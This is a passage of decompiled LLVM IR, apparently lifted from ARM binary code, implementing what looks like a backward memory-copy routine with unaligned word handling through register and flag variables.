  %v18_16eb8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_16eb8, i32* %v17_16eb8, align 4
  store i32 %v7_16eb8, i32* %r0.global-to-local, align 4
  %v6_16ebc = load i32, i32* %r2.global-to-local, align 4
  %v7_16ebc = add i32 %v6_16ebc, -16
  store i32 %v7_16ebc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16eb0, %bb148
  %v6_16ec8 = phi i32 [ %v7_16eb8, %bb148 ], [ %v6_16eb8, %dec_label_pc_16eb0 ]
  %v0_16ec0 = phi i32 [ %v7_16ebc, %bb148 ], [ %v0_16ec0.pr, %dec_label_pc_16eb0 ]
  %v4_16ec0 = add i32 %v0_16ec0, 20
  store i32 %v4_16ec0, i32* %r2.global-to-local, align 4
  %v6_16ec0 = sub i32 0, %v0_16ec0
  %v7_16ec0 = and i32 %v4_16ec0, %v6_16ec0
  %v8_16ec0 = icmp slt i32 %v7_16ec0, 0
  store i1 %v8_16ec0, i1* %cpsr_v.global-to-local, align 1
  %v9_16ec0 = icmp slt i32 %v4_16ec0, 0
  store i1 %v9_16ec0, i1* %cpsr_n.global-to-local, align 1
  %v10_16ec0 = icmp eq i32 %v4_16ec0, 0
  store i1 %v10_16ec0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ec4 = icmp slt i32 %v0_16ec0, -20
  br i1 %v5_16ec4, label %.thread4, label %bb149

bb149:                                            ; preds = %.thread2
  %v6_16ec4 = load i32, i32* %r1.global-to-local, align 4
  %v7_16ec4 = add i32 %v6_16ec4, -4
  %v8_16ec4 = inttoptr i32 %v7_16ec4 to i32*
  %v9_16ec4 = load i32, i32* %v8_16ec4, align 4
  store i32 %v9_16ec4, i32* @r3, align 4
  %v10_16ec4 = add i32 %v6_16ec4, -8
  %v11_16ec4 = inttoptr i32 %v10_16ec4 to i32*
  %v12_16ec4 = load i32, i32* %v11_16ec4, align 4
  store i32 %v12_16ec4, i32* @ip, align 4
  %v13_16ec4 = add i32 %v6_16ec4, -12
  %v14_16ec4 = inttoptr i32 %v13_16ec4 to i32*
  %v15_16ec4 = load i32, i32* %v14_16ec4, align 4
  store i32 %v15_16ec4, i32* %lr.global-to-local, align 4
  store i32 %v13_16ec4, i32* %r1.global-to-local, align 4
  %v7_16ec8 = add i32 %v6_16ec8, -12
  %v8_16ec8 = inttoptr i32 %v7_16ec8 to i32*
  store i32 %v9_16ec4, i32* %v8_16ec8, align 4
  %v10_16ec8 = add i32 %v6_16ec8, -8
  %v11_16ec8 = inttoptr i32 %v10_16ec8 to i32*
  %v12_16ec8 = load i32, i32* @ip, align 4
  store i32 %v12_16ec8, i32* %v11_16ec8, align 4
  %v13_16ec8 = add i32 %v6_16ec8, -4
  %v14_16ec8 = inttoptr i32 %v13_16ec8 to i32*
  %v15_16ec8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16ec8, i32* %v14_16ec8, align 4
  store i32 %v7_16ec8, i32* %r0.global-to-local, align 4
  %v6_16ecc = load i32, i32* %r2.global-to-local, align 4
  %v7_16ecc = add i32 %v6_16ecc, -12
  store i32 %v7_16ecc, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb149
  %v6_16eec45 = phi i32 [ %v6_16ec8, %.thread2 ], [ %v7_16ec8, %bb149 ]
  %v0_16ed443 = phi i32 [ %v4_16ec0, %.thread2 ], [ %v7_16ecc, %bb149 ]
  %v2_16ed0 = load i8*, i8** %stack_var_-8, align 4
  %v3_16ed0 = ptrtoint i8* %v2_16ed0 to i32
  store i32 %v3_16ed0, i32* @r4, align 4
  store i32 %v8_16e8c, i32* @lr, align 4
  br label %dec_label_pc_16ed4

dec_label_pc_16ed4:                               ; preds = %dec_label_pc_16e84, %.thread4
  %v7_16ee4 = phi i32 [ %v0_16e9c37, %dec_label_pc_16e84 ], [ %v6_16eec45, %.thread4 ]
  %v0_16ed4 = phi i32 [ %v2_16e84, %dec_label_pc_16e84 ], [ %v0_16ed443, %.thread4 ]
  %v2_16ed4 = add i32 %v0_16ed4, 8
  store i32 %v2_16ed4, i32* %r2.global-to-local, align 4
  %v4_16ed4 = sub i32 0, %v0_16ed4
  %v5_16ed4 = and i32 %v2_16ed4, %v4_16ed4
  %v6_16ed4 = icmp slt i32 %v5_16ed4, 0
  store i1 %v6_16ed4, i1* %cpsr_v.global-to-local, align 1
  %v7_16ed4 = icmp slt i32 %v2_16ed4, 0
  store i1 %v7_16ed4, i1* %cpsr_n.global-to-local, align 1
  %v8_16ed4 = icmp eq i32 %v2_16ed4, 0
  store i1 %v8_16ed4, i1* %cpsr_z.global-to-local, align 1
  %v5_16ed8 = icmp slt i32 %v0_16ed4, -8
  br i1 %v5_16ed8, label %bb151, label %dec_label_pc_16edc

dec_label_pc_16edc:                               ; preds = %dec_label_pc_16ed4
  %v6_16edc = add i32 %v0_16ed4, 4
  store i32 %v6_16edc, i32* %r2.global-to-local, align 4
  %v8_16edc = sub i32 -5, %v0_16ed4
  %v9_16edc = and i32 %v8_16edc, %v2_16ed4
  %v10_16edc = icmp slt i32 %v9_16edc, 0
  store i1 %v10_16edc, i1* %cpsr_v.global-to-local, align 1
  %v11_16edc = icmp slt i32 %v6_16edc, 0
  store i1 %v11_16edc, i1* %cpsr_n.global-to-local, align 1
  %v12_16edc = icmp eq i32 %v2_16ed4, 4
  store i1 %v12_16edc, i1* %cpsr_z.global-to-local, align 1
  %v5_16ee0 = icmp slt i32 %v2_16ed4, 4
  %v6_16ee0 = load i32, i32* %r1.global-to-local, align 4
  %v7_16ee0 = add i32 %v6_16ee0, -4
  %v8_16ee0 = inttoptr i32 %v7_16ee0 to i32*
  %v9_16ee0 = load i32, i32* %v8_16ee0, align 4
  store i32 %v9_16ee0, i32* @r3, align 4
  br i1 %v5_16ee0, label %.thread8, label %bb150

.thread8:                                         ; preds = %dec_label_pc_16edc
  store i32 %v7_16ee0, i32* %r1.global-to-local, align 4
  %v8_16ee4 = add i32 %v7_16ee4, -4
  %v9_16ee4 = inttoptr i32 %v8_16ee4 to i32*
  store i32 %v9_16ee0, i32* %v9_16ee4, align 4
  %v10_16ee4 = load i32, i32* %r0.global-to-local, align 4
  %v11_16ee4 = add i32 %v10_16ee4, -4
  store i32 %v11_16ee4, i32* %r0.global-to-local, align 4
  %v0_16ef4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb151

bb150:                                            ; preds = %dec_label_pc_16edc
  %v10_16ee8 = add i32 %v6_16ee0, -8
  %v11_16ee8 = inttoptr i32 %v10_16ee8 to i32*
  %v12_16ee8 = load i32, i32* %v11_16ee8, align 4
  store i32 %v12_16ee8, i32* @ip, align 4
  store i32 %v10_16ee8, i32* %r1.global-to-local, align 4
  %v7_16eec = add i32 %v7_16ee4, -8
  %v8_16eec = inttoptr i32 %v7_16eec to i32*
  store i32 %v9_16ee0, i32* %v8_16eec, align 4
  %v10_16eec = add i32 %v7_16ee4, -4
  %v11_16eec = inttoptr i32 %v10_16eec to i32*
  %v12_16eec = load i32, i32* @ip, align 4
  store i32 %v12_16eec, i32* %v11_16eec, align 4
  store i32 %v7_16eec, i32* %r0.global-to-local, align 4
  %v6_16ef0 = load i32, i32* %r2.global-to-local, align 4
  %v7_16ef0 = add i32 %v6_16ef0, -4
  store i32 %v7_16ef0, i32* %r2.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread8, %dec_label_pc_16ed4, %dec_label_pc_16e64, %.thread14, %dec_label_pc_17098, %dec_label_pc_1702c, %dec_label_pc_16fc0, %bb150
  %v2_16ef8 = phi i32 [ %v11_16ee4, %.thread8 ], [ %v7_16ee4, %dec_label_pc_16ed4 ], [ %v2_16e68, %dec_label_pc_16e64 ], [ %v0_16f9020, %.thread14 ], [ %v2_16f0453, %dec_label_pc_17098 ], [ %v2_16f0452, %dec_label_pc_1702c ], [ %v2_16f0451, %dec_label_pc_16fc0 ], [ %v7_16eec, %bb150 ]
  %v0_16ef4 = phi i32 [ %v0_16ef4.pre, %.thread8 ], [ %v2_16ed4, %dec_label_pc_16ed4 ], [ %v2_16e6c, %dec_label_pc_16e64 ], [ %v2_16f38, %.thread14 ], [ %v0_16ef449, %dec_label_pc_17098 ], [ %v0_16ef448, %dec_label_pc_1702c ], [ %v0_16ef447, %dec_label_pc_16fc0 ], [ %v7_16ef0, %bb150 ]
  %v1_16ef4 = add i32 %v0_16ef4, 4
  store i32 %v1_16ef4, i32* @r2, align 4
  %v3_16ef4 = sub i32 0, %v0_16ef4
  %v4_16ef4 = and i32 %v1_16ef4, %v3_16ef4
  %v5_16ef4 = icmp slt i32 %v4_16ef4, 0
  store i1 %v5_16ef4, i1* %cpsr_v.global-to-local, align 1
  %v6_16ef4 = icmp slt i32 %v1_16ef4, 0
  store i1 %v6_16ef4, i1* %cpsr_n.global-to-local, align 1
  %v7_16ef4 = icmp eq i32 %v1_16ef4, 0
  store i1 %v7_16ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16ef4, label %.thread130, label %bb152

bb152:                                            ; preds = %bb151
  %v1_16efc = add i32 %v0_16ef4, 2
  %v3_16efc = sub i32 -3, %v0_16ef4
  %v4_16efc = and i32 %v3_16efc, %v1_16ef4
  %v5_16efc = icmp slt i32 %v4_16efc, 0
  store i1 %v5_16efc, i1* %cpsr_v.global-to-local, align 1
  %v6_16efc = icmp slt i32 %v1_16efc, 0
  store i1 %v6_16efc, i1* %cpsr_n.global-to-local, align 1
  %v7_16efc = icmp eq i32 %v1_16ef4, 2
  store i1 %v7_16efc, i1* %cpsr_z.global-to-local, align 1
  %v0_16f00 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f00 = add i32 %v0_16f00, -1
  %v2_16f00 = inttoptr i32 %v1_16f00 to i8*
  %v3_16f00 = load i8, i8* %v2_16f00, align 1
  %v4_16f00 = zext i8 %v3_16f00 to i32
  store i32 %v4_16f00, i32* @r3, align 4
  store i32 %v1_16f00, i32* %r1.global-to-local, align 4
  %v3_16f04 = add i32 %v2_16ef8, -1
  %v4_16f04 = inttoptr i32 %v3_16f04 to i8*
  store i8 %v3_16f00, i8* %v4_16f04, align 1
  %v5_16f04 = load i32, i32* %r0.global-to-local, align 4
  %v6_16f04 = add i32 %v5_16f04, -1
  store i32 %v6_16f04, i32* %r0.global-to-local, align 4
  %v0_16f08 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16f08 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16f08 = xor i1 %v0_16f08, %v1_16f08
  br i1 %v2_16f08, label %.thread129, label %bb153

bb153:                                            ; preds = %bb152
  %v3_16f08 = load i32, i32* %r1.global-to-local, align 4
  %v4_16f08 = add i32 %v3_16f08, -1
  %v5_16f08 = inttoptr i32 %v4_16f08 to i8*
  %v6_16f08 = load i8, i8* %v5_16f08, align 1
  %v7_16f08 = zext i8 %v6_16f08 to i32
  store i32 %v7_16f08, i32* @r3, align 4
  store i32 %v4_16f08, i32* %r1.global-to-local, align 4
  %v6_16f0c = add i32 %v5_16f04, -2
  %v7_16f0c = inttoptr i32 %v6_16f0c to i8*
  store i8 %v6_16f08, i8* %v7_16f0c, align 1
  %v8_16f0c = load i32, i32* %r0.global-to-local, align 4
  %v9_16f0c = add i32 %v8_16f0c, -1
  store i32 %v9_16f0c, i32* %r0.global-to-local, align 4
  %v1_16f10.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16f10.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb152, %bb153
  %v7_16f14 = phi i32 [ %v9_16f0c, %bb153 ], [ %v6_16f04, %bb152 ]
  %v2_16f14 = phi i1 [ %v2_16f10.pre, %bb153 ], [ %v1_16f08, %bb152 ]
  %v1_16f14 = phi i1 [ %v1_16f10.pre, %bb153 ], [ %v0_16f08, %bb152 ]
  %v0_16f10 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16f10 = xor i1 %v2_16f14, %v1_16f14
  %v4_16f10 = or i1 %v0_16f10, %v3_16f10
  br i1 %v4_16f10, label %.thread130, label %bb154

bb154:                                            ; preds = %.thread129
  %v5_16f10 = load i32, i32* %r1.global-to-local, align 4
  %v6_16f10 = add i32 %v5_16f10, -1
  %v7_16f10 = inttoptr i32 %v6_16f10 to i8*
  %v8_16f10 = load i8, i8* %v7_16f10, align 1
  %v9_16f10 = zext i8 %v8_16f10 to i32
  store i32 %v9_16f10, i32* @r3, align 4
  store i32 %v6_16f10, i32* %r1.global-to-local, align 4
  %v8_16f14 = add i32 %v7_16f14, -1
  %v9_16f14 = inttoptr i32 %v8_16f14 to i8*
  store i8 %v8_16f10, i8* %v9_16f14, align 1
  %v10_16f14 = load i32, i32* %r0.global-to-local, align 4
  %v11_16f14 = add i32 %v10_16f14, -1
  store i32 %v11_16f14, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16e74
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_16f1c = icmp eq i32 %v1_16e74, 1
  store i1 %v8_16f1c, i1* %cpsr_n.global-to-local, align 1
  %v9_16f1c = icmp eq i32 %v1_16e74, 2
  store i1 %v9_16f1c, i1* %cpsr_z.global-to-local, align 1
  %v1_16f20 = add i32 %v2_16e64, -1
  %v2_16f20 = inttoptr i32 %v1_16f20 to i8*
  %v3_16f20 = load i8, i8* %v2_16f20, align 1
  %v4_16f20 = zext i8 %v3_16f20 to i32
  store i32 %v4_16f20, i32* @r3, align 4
  store i32 %v1_16f20, i32* %r1.global-to-local, align 4
  %v3_16f24 = add i32 %v2_16e68, -1
  %v4_16f24 = inttoptr i32 %v3_16f24 to i8*
  store i8 %v3_16f20, i8* %v4_16f24, align 1
  %v5_16f24 = load i32, i32* %r0.global-to-local, align 4
  %v6_16f24 = add i32 %v5_16f24, -1
  store i32 %v6_16f24, i32* %r0.global-to-local, align 4
  br i1 %v8_16f1c, label %.thread14, label %bb155

bb155:                                            ; preds = %dec_label_pc_16f1c
  %v6_16f28 = load i32, i32* %r1.global-to-local, align 4
  %v7_16f28 = add i32 %v6_16f28, -1
  %v8_16f28 = inttoptr i32 %v7_16f28 to i8*
  %v9_16f28 = load i8, i8* %v8_16f28, align 1
  %v10_16f28 = zext i8 %v9_16f28 to i32
  store i32 %v10_16f28, i32* @r3, align 4
  store i32 %v7_16f28, i32* %r1.global-to-local, align 4
  %v9_16f2c = add i32 %v5_16f24, -2
  %v10_16f2c = inttoptr i32 %v9_16f2c to i8*
  store i8 %v9_16f28, i8* %v10_16f2c, align 1
  %v11_16f2c = load i32, i32* %r0.global-to-local, align 4
  %v12_16f2c = add i32 %v11_16f2c, -1
  store i32 %v12_16f2c, i32* %r0.global-to-local, align 4
  br i1 %v9_16f1c, label %.thread14, label %bb156

bb156:                                            ; preds = %bb155
  %v8_16f30 = load i32, i32* %r1.global-to-local, align 4
  %v9_16f30 = add i32 %v8_16f30, -1
  %v10_16f30 = inttoptr i32 %v9_16f30 to i8*
  %v11_16f30 = load i8, i8* %v10_16f30, align 1
  %v12_16f30 = zext i8 %v11_16f30 to i32
  store i32 %v12_16f30, i32* @r3, align 4
  store i32 %v9_16f30, i32* %r1.global-to-local, align 4
  %v11_16f34 = add i32 %v11_16f2c, -2
  %v12_16f34 = inttoptr i32 %v11_16f34 to i8*
  store i8 %v11_16f30, i8* %v12_16f34, align 1
  %v13_16f34 = load i32, i32* %r0.global-to-local, align 4
  %v14_16f34 = add i32 %v13_16f34, -1
  store i32 %v14_16f34, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb155, %dec_label_pc_16f1c, %bb156
  %v0_16f9020 = phi i32 [ %v12_16f2c, %bb155 ], [ %v6_16f24, %dec_label_pc_16f1c ], [ %v14_16f34, %bb156 ]
  %v0_16f38 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f38 = load i32, i32* @ip, align 4
  %v2_16f38 = sub i32 %v0_16f38, %v1_16f38
  store i32 %v2_16f38, i32* %r2.global-to-local, align 4
  %v4_16f38 = xor i32 %v1_16f38, %v0_16f38
  %v5_16f38 = xor i32 %v2_16f38, %v0_16f38
  %v6_16f38 = and i32 %v5_16f38, %v4_16f38
  %v7_16f38 = icmp slt i32 %v6_16f38, 0
  store i1 %v7_16f38, i1* %cpsr_v.global-to-local, align 1
  %v8_16f38 = icmp slt i32 %v2_16f38, 0
  store i1 %v8_16f38, i1* %cpsr_n.global-to-local, align 1
  %v9_16f38 = icmp eq i32 %v0_16f38, %v1_16f38
  store i1 %v9_16f38, i1* %cpsr_z.global-to-local, align 1
  %v5_16f3c = icmp slt i32 %v0_16f38, %v1_16f38
  br i1 %v5_16f3c, label %bb151, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %.thread14
  %v0_16f40 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f40 = urem i32 %v0_16f40, 4
  store i32 %v1_16f40, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16f40 = icmp eq i32 %v1_16f40, 0
  store i1 %v2_16f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f40, label %dec_label_pc_16e84, label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16e7c, %dec_label_pc_16f40
  %v0_16f9019 = phi i32 [ %v2_16e68, %dec_label_pc_16e7c ], [ %v0_16f9020, %dec_label_pc_16f40 ]
  %v0_1703c = phi i32 [ %v2_16e6c, %dec_label_pc_16e7c ], [ %v2_16f38, %dec_label_pc_16f40 ]
  %v0_16f48 = phi i32 [ %v2_16e64, %dec_label_pc_16e7c ], [ %v0_16f40, %dec_label_pc_16f40 ]
  %v0_16f50 = phi i32 [ %v1_16e7c, %dec_label_pc_16e7c ], [ %v1_16f40, %dec_label_pc_16f40 ]
  %v1_16f48 = and i32 %v0_16f48, -4
  store i32 %v1_16f48, i32* %r1.global-to-local, align 4
  %v1_16f4c = inttoptr i32 %v1_16f48 to i32*
  %v2_16f4c = load i32, i32* %v1_16f4c, align 4
  store i32 %v2_16f4c, i32* @r3, align 4
  %v7_16f50 = icmp ult i32 %v0_16f50, 2
  %v2_17034 = add i32 %v0_1703c, -12
  %v4_17034 = sub i32 11, %v0_1703c
  %v5_17034 = and i32 %v4_17034, %v0_1703c
  %v6_17034 = icmp slt i32 %v5_17034, 0
  store i1 %v6_17034, i1* %cpsr_v.global-to-local, align 1
  %v7_17034 = icmp slt i32 %v2_17034, 0
  store i1 %v7_17034, i1* %cpsr_n.global-to-local, align 1
  %v8_17034 = icmp eq i32 %v0_1703c, 12
  store i1 %v8_17034, i1* %cpsr_z.global-to-local, align 1
  %v5_17038 = icmp slt i32 %v0_1703c, 12
  br i1 %v7_16f50, label %dec_label_pc_17034, label %dec_label_pc_16f58

dec_label_pc_16f58:                               ; preds = %dec_label_pc_16f48
  %v8_16f50 = icmp eq i32 %v0_16f50, 2
  br i1 %v8_16f50, label %dec_label_pc_16fc8, label %dec_label_pc_16f5c

dec_label_pc_16f5c:                               ; preds = %dec_label_pc_16f58
  br i1 %v5_17038, label %dec_label_pc_16fa8, label %dec_label_pc_16f64

dec_label_pc_16f64:                               ; preds = %dec_label_pc_16f5c
  store i32 %v2_17034, i32* %r2.global-to-local, align 4
  %v3_16f68 = load i32, i32* @r4, align 4
  store i32 %v3_16f68, i32* %stack_var_-12, align 4
  %v6_16f68 = load i32, i32* @r5, align 4
  %v8_16f68 = inttoptr i32 %v6_16f68 to i8*
  store i8* %v8_16f68, i8** %stack_var_-8, align 4
  %v11_16f68 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16f6c

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f6c.dec_label_pc_16f6c_crit_edge, %dec_label_pc_16f64
  %v0_16f90 = phi i32 [ %v1_16f90, %dec_label_pc_16f6c.dec_label_pc_16f6c_crit_edge ], [ %v0_16f9019, %dec_label_pc_16f64 ]
  %v0_16f70 = phi i32 [ %v0_16f70.pre, %dec_label_pc_16f6c.dec_label_pc_16f6c_crit_edge ], [ %v1_16f48, %dec_label_pc_16f64 ]
  %v0_16f6c = phi i32 [ %v0_16f6c.pre, %dec_label_pc_16f6c.dec_label_pc_16f6c_crit_edge ], [ %v2_16f4c, %dec_label_pc_16f64 ]
  %v3_16f6c = mul i32 %v0_16f6c, 256
  store i32 %v3_16f6c, i32* %lr.global-to-local, align 4
  %v1_16f70 = add i32 %v0_16f70, -4
  %v2_16f70 = inttoptr i32 %v1_16f70 to i32*
  %v3_16f70 = load i32, i32* %v2_16f70, align 4
  store i32 %v3_16f70, i32* @r3, align 4
  %v4_16f70 = add i32 %v0_16f70, -8
  %v5_16f70 = inttoptr i32 %v4_16f70 to i32*
  %v6_16f70 = load i32, i32* %v5_16f70, align 4
  store i32 %v6_16f70, i32* %r4.global-to-local, align 4
  %v7_16f70 = add i32 %v0_16f70, -12
  %v8_16f70 = inttoptr i32 %v7_16f70 to i32*
  %v9_16f70 = load i32, i32* %v8_16f70, align 4
  store i32 %v9_16f70, i32* %r5.global-to-local, align 4
  %v10_16f70 = add i32 %v0_16f70, -16
  %v11_16f70 = inttoptr i32 %v10_16f70 to i32*
  %v12_16f70 = load i32, i32* %v11_16f70, align 4
  store i32 %v10_16f70, i32* %r1.global-to-local, align 4
  %v4_16f74 = udiv i32 %v12_16f70, 16777216
  %v5_16f74 = or i32 %v4_16f74, %v3_16f6c
  store i32 %v5_16f74, i32* %lr.global-to-local, align 4
  %v3_16f78 = mul i32 %v12_16f70, 256
  %v4_16f7c = udiv i32 %v9_16f70, 16777216
  %v5_16f7c = or i32 %v3_16f78, %v4_16f7c
  store i32 %v5_16f7c, i32* @ip, align 4
  %v3_16f80 = mul i32 %v9_16f70, 256
  %v4_16f84 = udiv i32 %v6_16f70, 16777216
  %v5_16f84 = or i32 %v3_16f80, %v4_16f84
  store i32 %v5_16f84, i32* %r5.global-to-local, align 4
  %v3_16f88 = mul i32 %v6_16f70, 256
  %v4_16f8c = udiv i32 %v3_16f70, 16777216
  %v5_16f8c = or i32 %v3_16f88, %v4_16f8c
  store i32 %v5_16f8c, i32* %r4.global-to-local, align 4
  %v1_16f90 = add i32 %v0_16f90, -16
  %v2_16f90 = inttoptr i32 %v1_16f90 to i32*
  store i32 %v5_16f8c, i32* %v2_16f90, align 4
  %v4_16f90 = add i32 %v0_16f90, -12
  %v5_16f90 = inttoptr i32 %v4_16f90 to i32*
  %v6_16f90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16f90, i32* %v5_16f90, align 4
  %v7_16f90 = add i32 %v0_16f90, -8
  %v8_16f90 = inttoptr i32 %v7_16f90 to i32*
  %v9_16f90 = load i32, i32* @ip, align 4
  store i32 %v9_16f90, i32* %v8_16f90, align 4
  %v10_16f90 = add i32 %v0_16f90, -4
  %v11_16f90 = inttoptr i32 %v10_16f90 to i32*
  %v12_16f90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16f90, i32* %v11_16f90, align 4
  store i32 %v1_16f90, i32* %r0.global-to-local, align 4
  %v0_16f94 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f94 = add i32 %v0_16f94, -16
  store i32 %v2_16f94, i32* %r2.global-to-local, align 4
  %v6_16f98 = icmp slt i32 %v0_16f94, 16
  br i1 %v6_16f98, label %dec_label_pc_16f9c, label %dec_label_pc_16f6c.dec_label_pc_16f6c_crit_edge

dec_label_pc_16f6c.dec_label_pc_16f6c_crit_edge:  ; preds = %dec_label_pc_16f6c
  %v0_16f6c.pre = load i32, i32* @r3, align 4
  %v0_16f70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16f6c

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f6c
  %v2_16f9c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f9c, i32* @r4, align 4
  %v5_16f9c = load i8*, i8** %stack_var_-8, align 4
  %v6_16f9c = ptrtoint i8* %v5_16f9c to i32
  store i32 %v6_16f9c, i32* @r5, align 4
  store i32 %v11_16f68, i32* @lr, align 4
  %v2_16fa0 = add i32 %v0_16f94, -4
  store i32 %v2_16fa0, i32* %r2.global-to-local, align 4
  %v4_16fa0 = add i32 %v0_16f94, 2147483632
  %v5_16fa0 = and i32 %v2_16fa0, %v4_16fa0
  %v6_16fa0 = icmp slt i32 %v5_16fa0, 0
  store i1 %v6_16fa0, i1* %cpsr_v.global-to-local, align 1
  %v7_16fa0 = icmp slt i32 %v2_16fa0, 0
  store i1 %v7_16fa0, i1* %cpsr_n.global-to-local, align 1
  %v8_16fa0 = icmp eq i32 %v2_16fa0, 0
  store i1 %v8_16fa0, i1* %cpsr_z.global-to-local, align 1
  %v5_16fa4 = icmp slt i32 %v2_16f94, -12
  br i1 %v5_16fa4, label %dec_label_pc_16fc0, label %dec_label_pc_16fa8

dec_label_pc_16fa8:                               ; preds = %dec_label_pc_16f9c, %dec_label_pc_16f5c, %dec_label_pc_16fa8
  %v1_16fb4 = phi i32 [ %v5_16fb4, %dec_label_pc_16fa8 ], [ %v1_16f90, %dec_label_pc_16f9c ], [ %v0_16f9019, %dec_label_pc_16f5c ]
  %v0_16fa8 = load i32, i32* @r3, align 4
  %v3_16fa8 = mul i32 %v0_16fa8, 256
  store i32 %v3_16fa8, i32* %ip.global-to-local, align 4
  %v0_16fac = load i32, i32* %r1.global-to-local, align 4
  %v1_16fac = add i32 %v0_16fac, -4
  %v2_16fac = inttoptr i32 %v1_16fac to i32*
  %v3_16fac = load i32, i32* %v2_16fac, align 4
  store i32 %v3_16fac, i32* @r3, align 4
  store i32 %v1_16fac, i32* %r1.global-to-local, align 4
  %v4_16fb0 = udiv i32 %v3_16fac, 16777216
  %v5_16fb0 = or i32 %v4_16fb0, %v3_16fa8
  store i32 %v5_16fb0, i32* @ip, align 4
  %v2_16fb4 = add i32 %v1_16fb4, -4
  %v3_16fb4 = inttoptr i32 %v2_16fb4 to i32*
  store i32 %v5_16fb0, i32* %v3_16fb4, align 4
  %v4_16fb4 = load i32, i32* %r0.global-to-local, align 4
  %v5_16fb4 = add i32 %v4_16fb4, -4
  store i32 %v5_16fb4, i32* %r0.global-to-local, align 4
  %v0_16fb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16fb8 = add i32 %v0_16fb8, -4
  store i32 %v2_16fb8, i32* %r2.global-to-local, align 4
  %v6_16fbc = icmp slt i32 %v0_16fb8, 4
  br i1 %v6_16fbc, label %dec_label_pc_16fc0.loopexit, label %dec_label_pc_16fa8

dec_label_pc_16fc0.loopexit:                      ; preds = %dec_label_pc_16fa8
  %v4_16fb8 = sub i32 3, %v0_16fb8
  %v5_16fb8 = and i32 %v4_16fb8, %v0_16fb8
  %v6_16fb8 = icmp slt i32 %v5_16fb8, 0
  %v7_16fb8 = icmp slt i32 %v2_16fb8, 0
  store i1 %v6_16fb8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16fb8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16fc0

dec_label_pc_16fc0:                               ; preds = %dec_label_pc_16fc0.loopexit, %dec_label_pc_16f9c
  %v2_16f0451 = phi i32 [ %v5_16fb4, %dec_label_pc_16fc0.loopexit ], [ %v1_16f90, %dec_label_pc_16f9c ]
  %v0_16ef447 = phi i32 [ %v2_16fb8, %dec_label_pc_16fc0.loopexit ], [ %v2_16fa0, %dec_label_pc_16f9c ]
  %v0_16fc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fc0 = add i32 %v0_16fc0, 3
  store i32 %v1_16fc0, i32* %r1.global-to-local, align 4
  br label %bb151

dec_label_pc_16fc8:                               ; preds = %dec_label_pc_16f58
  br i1 %v5_17038, label %dec_label_pc_17014, label %dec_label_pc_16fd0

dec_label_pc_16fd0:                               ; preds = %dec_label_pc_16fc8
  store i32 %v2_17034, i32* %r2.global-to-local, align 4
  %v3_16fd4 = load i32, i32* @r4, align 4
  store i32 %v3_16fd4, i32* %stack_var_-12, align 4
  %v6_16fd4 = load i32, i32* @r5, align 4
  %v8_16fd4 = inttoptr i32 %v6_16fd4 to i8*
  store i8* %v8_16fd4, i8** %stack_var_-8, align 4
  %v11_16fd4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16fd8

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16fd8.dec_label_pc_16fd8_crit_edge, %dec_label_pc_16fd0
  %v0_16ffc = phi i32 [ %v1_16ffc, %dec_label_pc_16fd8.dec_label_pc_16fd8_crit_edge ], [ %v0_16f9019, %dec_label_pc_16fd0 ]
  %v0_16fdc = phi i32 [ %v0_16fdc.pre, %dec_label_pc_16fd8.dec_label_pc_16fd8_crit_edge ], [ %v1_16f48, %dec_label_pc_16fd0 ]
  %v0_16fd8 = phi i32 [ %v0_16fd8.pre, %dec_label_pc_16fd8.dec_label_pc_16fd8_crit_edge ], [ %v2_16f4c, %dec_label_pc_16fd0 ]
  %v3_16fd8 = mul i32 %v0_16fd8, 65536
  store i32 %v3_16fd8, i32* %lr.global-to-local, align 4
  %v1_16fdc = add i32 %v0_16fdc, -4
  %v2_16fdc = inttoptr i32 %v1_16fdc to i32*
  %v3_16fdc = load i32, i32* %v2_16fdc, align 4
  store i32 %v3_16fdc, i32* @r3, align 4
  %v4_16fdc = add i32 %v0_16fdc, -8
  %v5_16fdc = inttoptr i32 %v4_16fdc to i32*
  %v6_16fdc = load i32, i32* %v5_16fdc, align 4
  store i32 %v6_16fdc, i32* %r4.global-to-local, align 4
  %v7_16fdc = add i32 %v0_16fdc, -12
  %v8_16fdc = inttoptr i32 %v7_16fdc to i32*
